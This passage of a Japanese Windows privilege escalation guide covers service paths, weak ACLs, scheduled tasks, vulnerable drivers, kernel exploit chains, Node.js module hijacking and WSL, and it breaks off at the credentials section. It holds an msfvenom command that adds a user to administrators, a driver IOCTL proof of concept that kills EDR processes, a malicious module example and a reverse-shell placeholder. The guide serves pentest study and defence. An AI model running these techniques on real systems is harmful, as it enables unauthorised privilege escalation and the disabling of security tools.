	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**metasploit の `exploit/windows/local/trusted\_service\_path` を使って、この脆弱性を検出して exploit できます。** metasploit を使って、サービスバイナリを手動で作成することもできます。

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### 回復アクション

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能では、実行対象としてバイナリを指定できます。そのバイナリを置き換え可能な場合、権限昇格が可能なことがあります。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## スケジュールされたタスクのスクリプトターゲット

有効なタスクが `.bat` または `.cmd` ファイルを指定して `cmd.exe /c` を実行する場合、`cmd.exe` だけでなく、**アクションの引数**で指定されているスクリプトも確認してください。PowerShell の `-File` など、インタープリターに明示的なファイル引数を渡す場合も同様です。スケジュールされたバッチファイルに PowerShell の `-File` 呼び出しが直接記述されている場合は、参照先スクリプトの ACL も確認してください。変数、条件分岐、シェルの連結がある場合は、手動で処理を追跡する必要があります。呼び出し元が書き込み可能なスクリプトや親ディレクトリが、別アカウントのコンテキストで実行させる手掛かりになるのは、設定されたタスクのプリンシパルが呼び出し元と異なり、かつタスクが実際にそのアクションを実行する場合に限られます。スクリプトでは追記のみ可能な ACL が問題になることがありますが、先行する `exit` やその他の制御フローによって、追記した行が実行されない場合もあります。権限昇格と断定する前に、有効な ACL、[タスクの実行コンテキスト](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、作業ディレクトリ、トリガー、アプリケーション制御ポリシーを確認してください。インベントリ作成時にスクリプトを変更したり、タスクを開始したりしてはいけません。

## アクセス可能なファイル内の名前付きストリーム

NTFS では、読み取り可能なファイルに名前付きの `:$DATA` ストリームが含まれていても、通常のディレクトリ一覧には表示されないことがあります。アクセス可能なバックアップや構成ファイルのうち、対象を小規模かつ関連性の高いものに絞り、内容を開く前にストリームの**名前とサイズ**を確認してください。Windows では [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) および PowerShell の [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) で確認できます。秘密情報を示唆するストリーム名は、あくまで手掛かりです。ファイルに対する有効な読み取り権限、ファイルシステムがストリームをサポートしているか、ストリームに利用可能な認証情報が含まれているか、実際にどのアカウントとして認証されるかを確認してください。通常の列挙では、再帰的なストリーム検索やストリーム内容の出力は避けてください。

## スケジュールされた Windows Driver Kit ヘルパーの入力ファイル

オプションの Windows Driver Kit には `StandaloneRunner.exe` が含まれており、実行ディレクトリにある `command.txt`、`reboot.rsf`、およびプロジェクトの `working\rsf.rsf` ファイルを読み込むことがあります。特権アカウントでこのヘルパーを起動するスケジュールされたタスクやサービスがある場合、ヘルパー実行ファイル自体が保護されていても、これらの入力ファイルへの低権限ユーザーの書き込みアクセスによって、そのアカウントのコンテキストでコマンドを実行できる可能性があります。特権で実行する側が存在し、**両方の**サイドカーファイルを作成または変更できることを確認してください。ヘルパーを見つけただけでは不十分です。

スケジュールされたタスクの場合、アクションの [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) と、2 つのサイドカーパスの ACL を確認してください。タスクに作業ディレクトリが指定されていない場合、実行ファイルのディレクトリは確認すべき手掛かりにすぎず、タスクがそこから入力を読み込む証拠にはなりません。プロジェクトの作業ファイルに関する前提条件も満たす必要があります。SYSTEM で実行されると決めつけず、実際のタスクプリンシパルを確認してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（上書きして権限昇格できる場合があります）と、**フォルダーの権限**（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent の修復パス

[CVE-2024-0670](https://checkmk.com/werk/16361) は、`C:\Windows\Temp` にコマンドファイルを書き込み、置き換えに失敗した場合に既存の書き込み保護されたファイルを実行していた、古い Checkmk Windows agent に影響します。ベンダーは 2.1.0p40、2.2.0p23、2.3.0b1、2.4.0b1 でこの問題を修正しました。インストールされている正確なパッチレベルと、影響を受ける agent の操作を実行できるかを確認してください。`2.1` のようなブランチのみの表示では、脆弱性の有無を判断できません。ファイルの作成や agent コマンドの実行を伴わずに、バージョン、サービスの状態、Temp のアクセス許可を調査できます。

#### ADSelfService Plus SAML サービスの確認

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) は build 6210 以前の ADSelfService Plus に影響し、ベンダーは build 6211 で修正しました。この脆弱性が関係するのは、SAML SSO が**有効である、または過去に有効だった**場合に限られます。そのため、インストール済み製品のエントリやサービスのパスは調査の手がかりにはなりますが、脆弱性の判定にはなりません。正確な build、SAML 設定の履歴、サービスへのネットワーク到達性、およびサービスの実行アカウントを確認してください。サービス経由のコード実行では、そのアカウントの権限が引き継がれます。SYSTEM で実行されるのは、インスタンスが SYSTEM として実行されている場合に限られます。製品の Backup ディレクトリにある読み取り可能な `OfflineBackup_*.ezip` は、別個の暗号化バックアップに関する手がかりであり、利用可能な認証情報やこの SAML の脆弱性を示す証拠ではありません。通常の列挙では展開せず、パスとアクセス権を記録してください。

#### Jenkins controller とドメインアカウントの境界

Windows Jenkins controller では、job の作成または設定権限と、job の開始権限を区別してください。[Jenkins のドキュメントでは、これらは個別の `Job/Create`、`Job/Configure`、`Job/Build` 権限として説明されています](https://www.jenkins.io/doc/book/security/access-control/permissions/)。設定済みのスケジュールやリモートトリガーが別の build 実行経路になる場合もありますが、それが有効で、実際に build が実行されることを確認してください。実行時の ID は controller または選択された agent のものとなり、保存された認証情報を使えるのは、その job が認証情報のスコープにアクセスできる場合に限られます。別途、`JENKINS_HOME` のメタデータへのアクセスを調査してください。Jenkins は認証情報のデータと暗号化キーを `credentials.xml`、`secrets/hudson.util.Secret`、`secrets/master.key` に保存します（[Jenkins の secret storage](https://www.jenkins.io/doc/developer/security/secrets/)）。これらが存在するだけでは、パスワードが判明したことにはなりません。**必要なファイルへの読み取りアクセス**と、別個のアカウント再利用経路を確認し、共有出力に secret を表示しないでください。そのアカウントが AD ユーザーオブジェクトの `scriptPath` 書き込み権限を持つ場合は、書き込み可能なスクリプトパスと、対象ユーザーとして実行される実際のログオンまたはスケジュール実行の利用者が存在することを確認してから、ユーザーをまたいだ実行と判断してください。さらにグループを制御できるかどうかは、実効 AD 権限を別途確認する必要があります。

#### Azure Pipelines self-hosted agent の ID

Azure DevOps Server または Azure Pipelines プロジェクトでは、pipeline の**作成または編集**権限と、pipeline を**queue に登録**して選択された agent pool を使用する権限を区別してください。[Microsoft は pipeline の権限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)と[pool の認可](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)を別々に説明しています。権限の低いアカウントが script step を送信し、その pipeline を self-hosted Windows agent 上で実行できる場合、その step は[agent に設定されたオペレーティングシステムアカウント](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)として実行されます。ユーザーをまたぐ権限移行や SYSTEM への移行を主張する前に、対象の pipeline、ブランチやリソースの制限、認可された pool、実行可能な job、agent のサービス ID を確認してください。agent のインストール、プロジェクトのロール、またはリポジトリへの書き込み権限だけでは、いずれも調査の手がかりにすぎません。受動的な列挙では、build を開始せずに権限とローカルのサービスメタデータを確認してください。

#### Microsoft Entra Connect Sync の認証情報

[Microsoft の説明](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)では、同期サービスを実行して SQL database にアクセスする **ADSync サービスアカウント**と、権限が設定済みの同期機能によって異なる **AD DS connector アカウント**が区別されています。connector の認証情報はその database に暗号化して保存され、鍵のデータは[ADSync サービスアカウントの DPAPI によって保護されています](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)。同期サービスのインストール、ローカル管理者のような名前のグループ、または database を閲覧できることだけでは、復号可能な認証情報やドメイン権限昇格が確認されたことにはなりません。実際の database 読み取り権限、サービスアカウントと鍵へのアクセス、インストール先と SQL の構成、設定済みの connector ID、その ID の実効 AD 権限をそれぞれ確認してください。通常の列挙ではサービスとアクセスのメタデータのみを表示し、保存されている secret の照会や表示は行わないでください。

#### プリンタードライバーのサポート DLL のアクセス許可

インストール済みプリンタードライバーは、サポート DLL を `C:\ProgramData` 以下に保持し、より高い権限を持つ print process で読み込む場合があります。printer WMI の列挙が拒否されても、親ディレクトリや reparse point を含めて、対象のドライバーディレクトリと DLL の ACL を確認してください。[Ricoh printer-driver の問題 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) では、報告されたパスは `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` でした。[元の開示情報](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)では、`PrintIsolationHost.exe` による DLL の読み込みについて説明されています。書き込み可能な ACL は調査の手がかりにすぎません。拒否エントリを考慮した実効書き込み権限、該当するドライバーがインストールされており、特権 ID のもとでファイルを読み込むこと、ベンダーの更新済みドライバーまたはセキュリティプログラムによってインストールが修正されているかを確認してください。ディレクトリ名やドライバーのバージョンだけから脆弱性を推定しないでください。

### 書き込み権限

設定ファイルを変更して特殊なファイルを読み取れるか、または Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるかを確認してください。

システム内のアクセス許可が弱いフォルダーやファイルを見つける方法の一つは、次のとおりです。

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoloadによる永続化/実行

Notepad++は、`plugins`サブフォルダー内にあるプラグインDLLを自動ロードします。書き込み可能なポータブル版/コピー版のインストールが存在する場合、悪意のあるプラグインを配置するだけで、起動のたびに`notepad++.exe`内でコードが自動実行されます（`DllMain`やプラグインコールバックからも実行されます）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別のユーザーによって実行されるレジストリやバイナリを上書きできるか確認してください。**\
権限昇格に利用できる興味深い**autorunsの場所**について詳しく知るには、**以下のページを読んでください**。


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

**サードパーティ製の不審な/脆弱な**ドライバーがないか調べてください.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

ドライバーが任意の kernel read/write primitive（設計の不十分な IOCTL handler でよく見られます）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> 手順を追った technique は、こちらを参照してください。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Windows kernel exploitation 関連資料:

user-writable な read/write register を使う kernel-mode ring-buffer の例については、[USB MIDI looped-streaming variant](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming) を参照してください。

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

脆弱な呼び出しが攻撃者制御の Object Manager path を開く race-condition bug では、lookup を意図的に遅くする（最大長の component や深い directory chain を使う）ことで、競合可能な時間を数 microsecond から数十 microsecond に延ばせます。

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

Windows kernel LPE chain は、単体では弱い2つの bug を組み合わせて構築できることがあります。1つは、queue lock を保持したまま request/CBD を解放する **cancel-safe queue の lifetime race**、もう1つは、`RtlCopyToUser` 中に解放済みの paged-pool allocation を leak する **copy 前の lock 解放による disclosure** です。<sup>[[29]](#references)</sup>

監査と exploitation に関するメモ:

- **lock 保持中に解放し、その後 cancel**: success path が **Acquire -> CompleteRequest/free -> Release** を行い、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を行う箇所を探します。success path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` で待機していた thread が再開後、解放済みの `PFLT_CALLBACK_DATA` を driver の remove callback に渡す可能性があります。
- 解放済みの queue object を、同じサイズの攻撃者制御 paged-pool allocation で **reclaim** します。`NPFS` Data Queue Entries は payload と size を制御でき、後から pipe の read/peek operation で調べられるため有用です。解放済み object に list link が含まれる場合は、これを **user memory 内の fake request node の cyclic list** で上書きします。これにより、driver は元の list head で停止せず、攻撃者定義の request structure を繰り返し処理します。
- **予測可能な write を強化する**: fake request によって bookkeeping write（timestamp / QPC / refcount 付近の field）で使われる nested context pointer を差し替えられる場合、**書き込み先の address は制御できても値は制御できない** kernel write が得られることがあります。その場合は最終的な code/data pointer ではなく、spray した pool object の **length/size** field を狙い、破損した object が **out-of-bounds paged-pool read** を引き起こすまで spray を列挙します。
- **race 可能な disclosure のパターン**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を行う syscall は、いずれも有力な候補です。攻撃者がコピーする buffer を大きくできる場合（たとえば、serializer の最終 allocation size を増やす list/resource entry を多数追加するなど）、より長い copy によって replacement の時間幅が広がり、必ずしもマシンを crash させずに信頼性を高められます。
- **pointer を多く含む refill target**: Windows **I/O ring** の registered-buffer array は、paged-pool size を攻撃者が制御でき（`8 * regBufferCnt`）、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer であるため、優れた disclosure target です。array を1つ leak して周囲の `IORING_OBJECT` を特定し、**`RegBuffers`** と **`RegBuffersCount`** を破損させると、その後の I/O ring operation に攻撃者が偽造した entry を使わせ、任意の kernel read/write を実現できます。利用可能な write が安定した byte（たとえば `KUSER_SHARED_DATA+0x14` から得られる値）しか書けない場合は、**unaligned write の重ね合わせ**で `0x0101010101010101` のような同じ byte の繰り返しからなる user pointer を作り、`VirtualAlloc` でそのアドレスを map し、偽造した registered-buffer array を配置します。<sup>[[30]](#references)</sup>

デバッグ時に役立つ指標:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

破損した I/O ring から任意の kernel read/write を取得したら、標準的な post-primitive workflow を使って SYSTEM token を窃取します。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive のメモリ破損プリミティブ

最新の hive の脆弱性では、決定論的なメモリ配置を整え、書き込み可能な HKLM/HKU の子キーを悪用し、メタデータの破損をカーネルの paged-pool overflow に変換できます。カスタムドライバーは不要です。攻撃チェーンの全容はこちら:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 攻撃者が制御するパスを使った `RtlQueryRegistryValues` の direct-mode 型混同

一部のドライバーは、ユーザーランドから渡された registry path が妥当な UTF-16 文字列であることだけを検証し、その後 `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を呼び出して、`RTL_QUERY_REGISTRY_DIRECT` で `int readValue` のようなスタック上のスカラーに値を書き込みます。`RTL_QUERY_REGISTRY_TYPECHECK` が指定されていない場合、`EntryContext` は開発者が想定した型ではなく、レジストリの**実際の**型に基づいて解釈されます。

これにより、次の2つの有用なプリミティブが得られます:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ユーザーが制御する絶対パス `\Registry\...` を指定すると、ドライバーに攻撃者が選んだキーを照会させ、戻り値やログを通じてキーの存在を漏えいさせられます。また、呼び出し元が直接アクセスできない値を読み取れる場合もあります。
- **Kernel memory corruption**: `&readValue` のようなスカラーの格納先は、レジストリ値の型に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定付きのバイナリバッファとして型混同されます。

実践的な悪用に関する注意点:

- **Windows 8 以降の緩和策**: `RTL_QUERY_REGISTRY_TYPECHECK` を指定せずに `RTL_QUERY_REGISTRY_DIRECT` で**信頼されていない hive** を照会すると、カーネル呼び出し元は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` でクラッシュします。悪用可能な状態を保つには、`HKCU` の下に値を用意するのではなく、**信頼されたシステム hive 内の攻撃者が書き込み可能なキー**を探してください。
- **信頼された hive への値の配置**: NtObjectManager を使って `\Registry\Machine` 配下の書き込み可能な子キーを列挙し、複製した**低整合性**トークンでスキャンを再実行して、サンドボックス化されたコンテキストからアクセスできるキーを見つけます:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byteの`int`への8-byteの直接書き込みは、隣接するスタックデータを破損させ、近くのコールバック/関数ポインターを部分的に上書きする可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指していることを想定します。コードがまず攻撃者制御の`REG_DWORD`をスタックスカラーに読み込み、その後、同じバッファを文字列読み込みに再利用する場合、攻撃者は`Length`/`MaximumLength`を制御し、`Buffer`ポインターにも部分的な影響を与えられるため、半制御のカーネル書き込みが可能になります。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは`EntryContext`の先頭にある`LONG`を符号付きバッファサイズとして扱います。先行する`REG_DWORD`の読み込みによって、再利用されるスカラーに攻撃者制御の**負の値**が残っていると、次の`REG_BINARY`クエリで攻撃者のバイト列が隣接するスタックスロットへ直接コピーされます。この方法は、コールバックポインターを完全に上書きするうえで、最も簡単な手法となることがよくあります。

有力なハンティングパターン: **初期化し直さずに、同じスタック変数へ異種のレジストリ値を読み込むこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される`EntryContext`ポインター、最初のレジストリ読み込みによって2回目の読み込みを行うかどうかが決まるコードパスを検索します。

#### デバイスオブジェクトでのFILE_DEVICE_SECURE_OPEN未設定の悪用（LPE + EDR kill）

一部の署名済みサードパーティ製ドライバーは、IoCreateDeviceSecureで強固なSDDLを指定してデバイスオブジェクトを作成しますが、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れます。このフラグがない場合、追加のコンポーネントを含むパス経由でデバイスを開くときにセキュアDACLが適用されず、権限のないユーザーでも次のような名前空間パスを使ってハンドルを取得できます:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際に確認された事例)

ユーザーがデバイスを開けると、ドライバーが公開する特権IOCTLを悪用して、LPEや改ざんを実行できます。実環境で確認された機能の例:
- 任意のプロセスに対するフルアクセスハンドルを返す（トークン窃取 / DuplicateTokenEx/CreateProcessAsUserによるSYSTEMシェル）。
- 無制限のraw disk読み取り/書き込み（オフラインでの改ざん、起動時の永続化手法）。
- Protected Process/Light (PP/PPL)を含む任意のプロセスを終了させることで、カーネル経由でユーザーランドからAV/EDRを停止する。

最小限のPoCパターン（ユーザーモード）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

開発者向けの緩和策
- DACLで制限するデバイスオブジェクトを作成する際は、必ずFILE_DEVICE_SECURE_OPENを設定してください。
- 特権操作では呼び出し元のコンテキストを検証してください。プロセスの終了やハンドルの返却を許可する前に、PP/PPLチェックを追加してください。
- IOCTL（アクセスマスク、METHOD_*、入力検証）を制限し、カーネル権限を直接使うのではなく、ブローカーを介する方式も検討してください。

防御側の検知アイデア
- 不審なデバイス名（例：\\ .\\amsdk*）へのユーザーモードからのオープンや、悪用を示す特定のIOCTLシーケンスを監視してください。
- Microsoftの脆弱なドライバーのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可リスト／拒否リストも維持してください。


## PATH DLL Hijacking

**PATH上にあるフォルダーへの書き込み権限**があれば、プロセスが読み込むDLLをハイジャックして、**権限昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH内のすべてのフォルダーのアクセス許可を確認してください：

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

このチェックを悪用する方法の詳細については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron のモジュール解決ハイジャック

これは、期待されるモジュールが**見つからない**場合に、`require("foo")` のような bare import を実行する **Node.js** および **Electron** アプリケーションに影響する、**Windows の未制御な検索パス**の亜種です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上方向にたどり、各親ディレクトリにある `node_modules` フォルダーを確認して、パッケージを解決します。Windows では、この探索がドライブのルートに到達することがあるため、`C:\Users\Administrator\project\app.js` から起動したアプリケーションは、次の場所を順に調べる可能性があります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（またはパッケージフォルダー）を配置し、**より高い権限で動作する Node/Electron プロセス**が見つからない依存関係を解決するのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者として実行されている場合、昇格されたスケジュールタスクやサービスラッパーから実行されている場合、または自動起動する特権デスクトップアプリの場合、これは **LPE** につながります。

特に、次のようなケースでよく発生します。

- 依存関係が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- サードパーティライブラリが `require("foo")` を `try/catch` で囲み、失敗しても処理を続行する
- パッケージが本番ビルドから削除されている、パッケージ化時に含まれていない、またはインストールに失敗している
- 脆弱な `require()` がメインアプリケーションのコードではなく、依存関係ツリーの深い場所にある

### 脆弱なターゲットの調査

**Procmon** を使って解決パスを確認します。<sup>[[23]](#references)</sup>

- `Process Name` = 対象の実行ファイル（`node.exe`、Electron アプリの EXE、またはラッパープロセス）でフィルターする
- `Path` が `node_modules` を `contains` する条件でフィルターする
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最後に成功したオープンに注目する

展開した `.asar` ファイルやアプリケーションソースで確認すべき、コードレビュー上の有用なパターン：

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon またはソースレビューから**不足しているパッケージ名**を特定します。
2. まだ存在しない場合は、root lookup directory を作成します。

```powershell
mkdir C:\node_modules
```

3. 想定される正確な名前のモジュールを配置する:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. 被害者のアプリケーションを起動します。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込むことがあります。

このパターンに該当する、実際に使われている欠落したオプションモジュールの例として `bluebird` や `utf-8-validate` があります。ただし、再利用可能な**テクニック**の本質は、特権で実行される Windows の Node/Electron プロセスが解決する、欠落した bare import を見つけることです。

### 検出とハードニングのアイデア

- ユーザーが `C:\node_modules` を作成したり、そこに新しい `.js` ファイルやパッケージを書き込んだりした場合にアラートを出します。
- 高い整合性レベルで実行されるプロセスが `C:\node_modules\*` から読み込んでいないか調査します。
- 本番環境ではすべてのランタイム依存関係をパッケージ化し、`optionalDependencies` の使用状況を監査します。
- サードパーティーのコードにある、エラーを握りつぶす `try { require("...") } catch {}` パターンを確認します。
- ライブラリが対応している場合は、オプションのプローブを無効にします（たとえば、一部の `ws` の導入環境では `WS_NO_UTF_8_VALIDATE=1` により、レガシーな `utf-8-validate` のプローブを回避できます）。

## ネットワーク

### 共有

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

hostsファイルにハードコードされている他の既知のコンピューターを確認する

```
type C:\Windows\System32\drivers\etc\hosts
```

### ネットワークインターフェースとDNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 開いているポート

外部から**制限されたサービス**を確認する

```bash
netstat -ano #Opened ports?
```

ローカルリスナーについては、PIDをプロセスの所有者、実行ファイルのパス、および起動元のサービスやスケジュールされたタスクと照合します。リモートコントロールサービスでデスクトップユーザーとしてアクセスできるかどうかは、認証とコマンド制御の設定によります。高い権限を持つアカウントで実行されているカスタムTCPアプリケーションは、別途調査すべき対象です。リスナーとバイナリのパスは受動的な手掛かりにすぎません。認証後にメモリ破損を引き起こす経路を特定するには、そのバイナリと、到達可能な入力を分析する必要があります。公開ポートがシステムプロセスに属しているように見える場合は、バックエンドサービスを特定する前に [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) と照合してください。転送ルールがあるだけでは、宛先に到達可能であることや、脆弱であることの証明にはなりません。

### ルーティングテーブル

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARPテーブル

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### ファイアウォールのルール

[**ファイアウォール関連のコマンドはこちらのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化など）**

ネットワークの列挙に使える[コマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Linux 用 Windows サブシステム (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

rootユーザーを取得すると、任意のポートでリッスンできます（`nc.exe` で初めてポートをリッスンするとき、ファイアウォールで `nc` を許可するかどうかをGUIで確認されます）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

root として bash を簡単に起動するには、`--default-user root` を試してください。

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで、`WSL` のファイルシステムを確認できます。

WSL 内の Linux の `root` 権限だけでは、Windows の Administrator 権限は得られません。現在の Windows の ID でディストリビューションのファイルシステムを読み取れる場合は、コマンドによって認証情報が記録されている可能性があるため、`/root/.bash_history` などのシェル履歴ファイルを確認してください。ただし、権限昇格には、より高い権限を持つ有効なアカウントと、許可された認証経路が必要です。`LocalState\rootfs` という構成は古い WSL インストールに適用されます。WSL 2 では通常、ディストリビューションは [`ext4.vhdx` 仮想ディスク](https://learn.microsoft.com/en-us/windows/wsl/disk-space)に保存されるため、まず実際のディストリビューションと保存先を特定してください。自動列挙中に履歴の内容を出力するのは避けてください。

## Windows 認証情報

### Winlogon 認証情報

```bash
